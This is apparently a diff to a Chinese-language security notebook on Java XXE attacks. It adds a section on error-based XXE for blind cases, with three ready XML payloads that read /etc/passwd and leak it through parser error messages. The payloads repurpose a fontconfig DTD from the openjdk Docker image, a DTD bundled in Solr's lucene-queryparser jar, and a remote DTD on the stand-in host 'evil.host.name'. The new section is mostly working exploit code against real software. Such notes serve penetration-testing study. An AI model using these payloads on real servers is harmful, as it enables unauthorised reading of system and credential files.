@@ -193,6 +193,93 @@ root@VM-0-6-ubuntu:~/java/xxe# cat evilftp.xml
 
 所以用ftp能带出数据的版本是jdk<7u141和jdk<8u162
 
+## Error Based XXE
+
+在高版本Java且需要盲注的情况下，唯一的解决办法就是Error Based XXE，前期是服务器开启了报错。
+
+
+
+总的来说有三种方法：
+
+1. 利用操作系统上已有的dtd文件。比如Docker官方openjdk镜像，其安装了fontconfig-config这个包，这个包就包含一个dtd文件/usr/share/xml/fontconfig/fonts.dtd：
+   ```xml
+   <?xml version="1.0" ?>
+   <!DOCTYPE message [
+       <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+   
+       <!ENTITY % expr 'aaa)>
+           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+           &#x25;eval;
+           &#x25;error;
+           <!ELEMENT aa (bb'>
+   
+       %local_dtd;
+   ]>
+   <message>any text</message>
+   ```
+
+   
+
+2. 利用应用内部的dtd文件。比如比如Solr依赖的lucene-queryparser.jar中包含的LuceneCoreQuery.dtd：
+   ```xml
+   <?xml version="1.0" ?>
+   <!DOCTYPE message [
+       <!ENTITY % local_dtd SYSTEM "jar:file:///opt/solr/server/solr-webapp/webapp/WEB-INF/lib/lucene-queryparser-7.0.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
+   
+       <!ENTITY % queries 'aaa)>
+           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+           &#x25;eval;
+           &#x25;error;
+           <!ELEMENT aa (bb'>
+   
+       %local_dtd;
+   ]>
+   <message>any text</message>
+   ```
+
+   
+
+3. 利用远程dtd文件（出网）
+   ```xml
+   #服务器上放一个dtd
+   
+   <!ENTITY % test "example">
+   <!ELEMENT pattern (%test;)>
+   
+   ```
+
+   
+
+   
+
+
+   ```xml
+   <?xml version="1.0" ?>
+   <!DOCTYPE message [
+       <!ENTITY % local_dtd SYSTEM "http://evil.host.name/include.dtd">
+   
+       <!ENTITY % test 'aaa)>
+           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+           &#x25;eval;
+           &#x25;error;
+           <!ELEMENT aa (bb'>
+   
+       %local_dtd;
+   ]>
+   <message>any text</message>
+   ```
+
+   
+
+   
+
+
+
+
+
 
 
 ## 有回显读文件的限制
